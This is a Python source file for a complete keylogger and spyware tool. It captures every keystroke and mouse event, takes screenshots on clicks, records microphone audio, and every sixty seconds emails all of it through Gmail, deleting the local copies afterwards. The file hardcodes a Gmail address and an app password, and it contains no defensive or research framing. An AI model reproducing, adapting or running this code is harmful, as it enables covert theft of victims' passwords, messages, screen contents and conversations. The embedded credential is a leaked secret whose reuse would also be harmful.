import smtplib
import threading
import socket
import platform
import os
import sounddevice as sd
from scipy.io.wavfile import write
from pynput import keyboard, mouse
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from PIL import ImageGrab

EMAIL_ADDRESS = "simmonchi02@gmail.com"  # Replace with real email
EMAIL_PASSWORD = "sybr tlgh qjcb qido"      # Use Gmail App Password
SEND_REPORT_EVERY = 60  # in secs
SCREENSHOT_DIR = "screenshots"

class KeyLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.log = ""
        self.email = email
        self.password = password
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)
        self.screenshot_counter = 0
        self.audio_filename = "mic_logging.wav"
        self.audio_duration = 10  # seconds to record each time
        self.sample_rate = 44100

    def append_log(self, string):
        self.log += string + "\n"

    def on_key_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)
        self.append_log(f"[KEY] {key_str}")

    def on_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        self.append_log(f"[MOUSE] {action} {button} at ({x}, {y})")

        # Screenshot on mouse press only
        if pressed:
            self.take_screenshot()

    def on_scroll(self, x, y, dx, dy):
        self.append_log(f"[MOUSE] Scrolled at ({x}, {y}) by ({dx}, {dy})")

    def on_move(self, x, y):
        self.append_log(f"[MOUSE] Moved to ({x}, {y})")

    def take_screenshot(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}_{self.screenshot_counter}.png")
        self.screenshot_counter += 1
        screenshot = ImageGrab.grab()
        screenshot.save(path)
        self.append_log(f"[SCREENSHOT] Captured at {timestamp}")

    def record_audio(self):
      try:
          self.append_log("[AUDIO] Recording mic input...")
          audio = sd.rec(int(self.audio_duration * self.sample_rate), samplerate=self.sample_rate, channels=2)
          sd.wait()
          write(self.audio_filename, self.sample_rate, audio)
          self.append_log("[AUDIO] Recording complete.")
      except Exception as e:
          self.append_log(f"[AUDIO] Recording failed: {e}")

    def send_mail(self, message):
        msg = MIMEMultipart()
        msg["From"] = self.email
        msg["To"] = self.email
        msg["Subject"] = f"Key/Mouse Logs - {self.start_dt.strftime('%Y-%m-%d %H:%M:%S')}"

        # Attach the log text
        msg.attach(MIMEText(message, "plain"))

        # Attach screenshots
        for filename in os.listdir(SCREENSHOT_DIR):
            if filename.endswith(".png"):
                path = os.path.join(SCREENSHOT_DIR, filename)
                with open(path, "rb") as f:
                    part = MIMEApplication(f.read(), Name=filename)
                    part["Content-Disposition"] = f'attachment; filename="{filename}"'
                    msg.attach(part)
                os.remove(path)  # Delete after attaching

        if os.path.exists(self.audio_filename):
          with open(self.audio_filename, "rb") as f:
              part = MIMEApplication(f.read(), Name=self.audio_filename)
              part["Content-Disposition"] = f'attachment; filename="{self.audio_filename}"'
              msg.attach(part)
          os.remove(self.audio_filename)  # deletes audio file after sending

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(self.email, self.password)
            server.send_message(msg)

    def report(self):
        if self.log.strip():
            self.end_dt = datetime.now()
            self.record_audio()
            self.send_mail(self.log)
            self.start_dt = datetime.now()
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def run(self):
        mouse_listener = mouse.Listener(
            on_click=self.on_click,
            on_scroll=self.on_scroll,
            on_move=self.on_move
        )
        mouse_listener.start()

        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        keyboard_listener.start()

        self.report()

        keyboard_listener.join()
        mouse_listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()